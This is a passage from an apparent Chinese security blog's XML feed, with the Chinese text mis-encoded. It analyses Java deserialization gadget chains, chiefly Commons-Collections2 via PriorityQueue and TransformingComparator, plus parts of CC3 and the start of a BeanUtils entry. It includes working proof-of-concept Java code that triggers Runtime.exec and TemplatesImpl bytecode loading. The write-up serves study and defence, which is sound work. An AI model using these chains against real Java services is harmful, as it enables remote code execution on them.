class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">       Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span> [] &#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span> [] &#123;templates&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">       <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">       <span class="comment">/*InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">       instantiateTransformer.transform(TrAXFilter.class);*/</span></span><br><span class="line">       HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">       Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">               map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">       constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">       <span class="comment">//serialize(o);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714669560414-6960b378-e64f-44d0-9074-f683ae520ea9.pdf">Javaå®‰å…¨æ¼«è°ˆ - 14.ä¸ºä»€ä¹ˆéœ€è¦CommonsCollections3.pdf</a></p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123376523">https://blog.csdn.net/weixin_54648419&#x2F;article&#x2F;details&#x2F;123376523</a></p><h3 id="cc3è°ƒç”¨é“¾"><a href="#cc3è°ƒç”¨é“¾" class="headerlink" title="cc3è°ƒç”¨é“¾"></a>cc3è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669437495-5c7c2b2f-a311-4a6d-b4d7-77283e919462.png"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections2ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡ysoçš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œcc2åˆ©ç”¨é“¾ç”¨çš„æ˜¯commons-collections4ç‰ˆæœ¬ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰ç”¨çš„æ˜¯3.1ç‰ˆæœ¬ã€‚æ‰€ä»¥é¦–å…ˆè¦ä¸‹è½½ä¸€ä¸‹ä¾èµ–ï¼Œpomæ–‡ä»¶åŠ å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨æ–¹å¼1ï¼š"><a href="#è°ƒç”¨æ–¹å¼1ï¼š" class="headerlink" title="è°ƒç”¨æ–¹å¼1ï¼š"></a>è°ƒç”¨æ–¹å¼1ï¼š</h3><p>ç„¶åå°±æ˜¯ä»–å‰åŠéƒ¨åˆ†çš„è°ƒç”¨é“¾å˜äº†å…ˆæ¥çœ‹ä¸€ä¸‹poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//åå°„è·å–æˆå‘˜å˜é‡çš„field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//è·å–è®¿é—®æƒé™</span></span><br><span class="line">        field.set(queue,comparator);<span class="comment">//è®¾ç½®å‚æ•°</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡pocæˆ‘ä»¬å‘ç°ååŠéƒ¨åˆ†ä¹Ÿæ˜¯ç”¨çš„ä¹Ÿæ˜¯invokertransformerè¿›è¡Œè§¦å‘çš„ï¼Œè¿™é‡Œä¸»è¦çœ‹å‰åŠéƒ¨åˆ†æ€ä¹ˆè°ƒç”¨çš„</p><p>è¿˜æ˜¯é€šè¿‡è·Ÿæ˜¯è°transformæ–¹æ³•æˆ‘ä»¬æ‰¾åˆ°äº†TransformingComparatorè¿™ä¸ªç±»ä¸­çš„compareæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718150278-b61e0267-8fc1-42a8-a328-6bd031a8d11e.png"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€å°†trangsformerå˜æˆinvokertransformerå¯¹è±¡å°±å¯ä»¥rceäº†</p><p>å†æ¥çœ‹çœ‹å…¶æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718263591-c880068a-15be-4705-9b86-c3c6f2bf29d5.png"></p><p>å¯ä»¥çœ‹åˆ°transformeræ˜¯å¯æ§çš„æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦æ‰¾åˆ°èƒ½å¤Ÿè§¦å‘compareçš„æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718373798-aaecb373-63f9-4b95-b6fc-615b6b0ce0ed.png"></p><p>æˆ‘ä»¬æ‰¾åˆ°äº†PriorityQueueç±»ä¸­çš„siftDownUsingComparatoræ–¹æ³•è°ƒç”¨äº†compareæ–¹æ³•ï¼Œè¿™é‡Œçœ‹ä¸‹æ„é€ æ–¹æ³•å‘ç°comparatorä¹Ÿæ˜¯å¯æ§çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718478028-692020a7-c1e9-47d5-b72f-e696f05b1e56.png"></p><p>æ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾åˆ°å¯ä»¥è§¦å‘siftDownUsingComparatorçš„æ–¹æ³•æˆ‘ä»¬å‘ç°åœ¨æœ¬ç±»çš„siftDownæ–¹æ³•è°ƒç”¨äº†è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718872060-36c80a00-7650-457e-857f-f5aa9a5d74bd.png"></p><p>å¹¶ä¸”åœ¨æœ¬ç±»çš„readObjectä¸­å‘ç°heapifyè°ƒç”¨äº†siftDownæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718555670-e74f356c-5991-4662-b0fa-d3ba3008b81f.png"></p><p>å¹¶ä¸”è¯¥sizeéœ€è¦å¤§äºç­‰äº2æ‰å¯ä»¥è¿›å…¥forå¾ªç¯æ‰€ä»¥å¯ä»¥æ„é€ pocäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°åœ¨åºåˆ—åŒ–ä¹‹å‰å°±è§¦å‘äº†åŸå› åœ¨äºaddæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718641827-ee67f3d4-9524-4118-88f3-30134d1b30a5.png"></p><p>è°ƒç”¨äº†offeræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718669019-1053aa9e-85c4-448d-98bf-30f88a2a5086.png"></p><p>è¯¥æ–¹æ³•åˆè°ƒç”¨äº†siftUpæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718687690-eec61593-5bfb-4225-b5ea-20ca9ff9089d.png"></p><p>å‘ç°åœ¨è¯¥æ–¹æ³•ä¸­ä¹Ÿè°ƒç”¨äº†siftDownUsingComparatoræ–¹æ³•æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨addçš„æ—¶å€™å°†comparartorè®©å…¶å€¼ä¸ºç©ºï¼Œåœ¨addä¹‹ååœ¨åå°„å°†å…¶å€¼è¯¥ä¸ºTransformingComparatorå¯¹è±¡å°±è¡Œpocå¦‚å¼€å¤´æ‰€ç¤º</p><h3 id="cc2-è°ƒç”¨é“¾"><a href="#cc2-è°ƒç”¨é“¾" class="headerlink" title="cc2 è°ƒç”¨é“¾"></a>cc2 è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740045347-efcf625e-3fc6-400e-b021-6d8b84d8e192.png"></p><h3 id="è°ƒç”¨æ–¹å¼2"><a href="#è°ƒç”¨æ–¹å¼2" class="headerlink" title="è°ƒç”¨æ–¹å¼2"></a>è°ƒç”¨æ–¹å¼2</h3><p>ç¬¬äºŒç§è°ƒç”¨æ–¹æ³•å°±æ˜¯ç»“åˆCC3ä¸­æ‰€ä»‹ç»åˆ°çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„å½¢å¼è¿›è¡Œè§¦å‘rceï¼Œå› ä¸ºé€šè¿‡ä¸Šæ–‡åˆ†æçš„æˆ‘ä»¬çŸ¥é“cc2ä¼šåœ¨TransformingComparatorè¿™ä¸ªç±»ä¸­çš„compareæ–¹æ³•ä¸­è°ƒç”¨transformæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æƒ³åˆ°åˆ©ç”¨Invokertransformè¿™ä¸ªç±»ä¸­çš„transformæ–¹æ³•æ¥è°ƒç”¨ä»»æ„ç±»çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åœ¨è¿™é‡Œæ³¨å…¥invokertransformå¯¹è±¡è°ƒç”¨transformæ–¹æ³•åœ¨è°ƒç”¨TemplateImplä¸­çš„newTransformeræ–¹æ³•æ¥è¿›è€Œè§¦å‘åŠ¨æ€ç±»åŠ è½½å®ç°rceã€‚</p><p>è¿™é‡Œç»™å‡ºpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">invokertransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;&#125;);</span><br><span class="line">       <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">       <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">       queue.add(templates);</span><br><span class="line">       queue.add(<span class="number">2</span>);<span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>).getDeclaredField(<span class="string">&quot;transformer&quot;</span>);<span class="comment">//åå°„è·å–æˆå‘˜å˜é‡çš„field</span></span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);<span class="comment">//è·å–è®¿é—®æƒé™</span></span><br><span class="line">       field.set(comparator,invokertransformer);<span class="comment">//è®¾ç½®å‚æ•°</span></span><br><span class="line">       <span class="comment">//serialize(queue);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>å…¶å®é€šè¿‡pocæˆ‘ä»¬èƒ½å¤Ÿå‘ç°å°±æ˜¯å°†æœ€åæ”¹æˆåŠ¨æ€è°ƒç”¨newTransformeræ–¹æ³•ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732359599-e550a791-ad16-48a8-baa8-89915e90bca2.png"></p><h4 id="é—®é¢˜1ï¼š"><a href="#é—®é¢˜1ï¼š" class="headerlink" title="é—®é¢˜1ï¼š"></a>é—®é¢˜1ï¼š</h4><p>è¿™é‡Œå…¶å®æˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³æ˜ç™½å°±æ˜¯åˆ©ç”¨invokertransformçš„transformæ–¹æ³•å»åŠ¨æ€è°ƒç”¨newTransformeræ–¹æ³•ä½†æ˜¯ä½ æ‰§è¡Œä¼šå‘ç°æŠ¥é”™æ‰¾ä¸åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰å°†è¯¥æ–¹æ³•çš„ç±»å¯¹è±¡ä¼ é€’è¿›å»è¿™é‡Œå¦‚ä½•ä¸åˆ©ç”¨ChainedTransformerè¿›è¡Œä¼ é€’å‘¢</p><p>é€šè¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥é€šè¿‡addæ–¹æ³•è¿›è¡Œæ·»åŠ </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732743981-a67b8b99-d4cd-4898-8565-fb99f2d7e1b4.png"></p><p>ä»–ä¼šä¼ å…¥åˆ°offeré‡Œé¢ï¼Œofferä¼šç»§ç»­è°ƒç”¨ siftUpæ–¹æ³•</p><p>ç»§ç»­å°†æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ”¾è¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732814267-bc951645-86cb-4e72-beb6-3fd050fa821d.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æ˜¯è¢«ä¼ é€’è¿›æ¥äº†ã€‚</p><h4 id="é—®é¢˜2ï¼š"><a href="#é—®é¢˜2ï¼š" class="headerlink" title="é—®é¢˜2ï¼š"></a>é—®é¢˜2ï¼š</h4><p>ç„¶åæˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„pocåœ¨ä¸€å¼€å§‹çš„æ—¶å€™å¹¶æ²¡æœ‰å°†ä¸€ä¸ªçœŸçš„invokertransformeræ”¾è¿›å»<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732918709-a4c299c3-83cc-4390-94b8-03cb0e133357.png"></p><p>è€Œæ˜¯åœ¨addä¹‹åé€šè¿‡åå°„ä¿®æ”¹äº†å…¶å€¼ï¼Œè¿™é‡Œä¸Šæ–‡ä¹Ÿè¯´äº†æ˜¯ä¸ºäº†é˜²æ­¢åœ¨addæ—¶è§¦å‘rceã€‚</p><h4 id="é—®é¢˜3ï¼š"><a href="#é—®é¢˜3ï¼š" class="headerlink" title="é—®é¢˜3ï¼š"></a>é—®é¢˜3ï¼š</h4><p>å°±æ˜¯æˆ‘ä»¬åœ¨addçš„æ—¶å€™éœ€è¦ä¼ å…¥ä¸¤ä¸ªtemplateså¯¹è±¡å—ï¼Œè¿™é‡Œç»è¿‡å®éªŒåªéœ€è¦å¯¹ç¬¬ä¸€ä¸ªä¼ å…¥å³å¯ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå¿…é¡»ä¼ å…¥ã€‚æˆ‘ä»¬æ¥è°ƒè¯•çœ‹çœ‹ä¸ºä»€ä¹ˆæˆ‘ä»¬ä»¥åªä¼ å…¥ç¬¬ä¸€ä¸ªtemplateså¯¹è±¡ä¸ºä¾‹è¿›è¡Œååºåˆ—åŒ–è°ƒè¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733177259-e939a2b9-9259-44af-95c4-092e61efe2ba.png"></p><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥çœ‹åˆ°å®ƒè·å–çš„æ˜¯ç¬¬ä¸€ä¸ªä¼ é€’çš„å‚æ•°çš„å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733194896-b2c9ae69-ef70-4c7b-a581-58effd95e190.png">ç»§ç»­è·Ÿè¿›å‘ç°ç¡®å®å–å‡ºæ¥çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733235272-4a1546c9-d040-42f1-86c9-7352f7293085.png"></p><p>è¿™é‡Œè°ƒç”¨çš„ä¹Ÿç¡®å®æ˜¯xçš„å€¼ï¼Œç»“åˆå‰é¢ä¸¤ä¸ªæ–¹æ³•åˆ†æè¯´æ˜ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä¼ å…¥templateså¯¹è±¡ã€‚</p><h3 id="cc2-TemplatesImplè°ƒç”¨é“¾"><a href="#cc2-TemplatesImplè°ƒç”¨é“¾" class="headerlink" title="cc2 TemplatesImplè°ƒç”¨é“¾"></a>cc2 TemplatesImplè°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740139727-d5bf08f6-e29f-4937-9eaa-82a02296e5c5.png"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-BeanUtilsååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-BeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-BeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
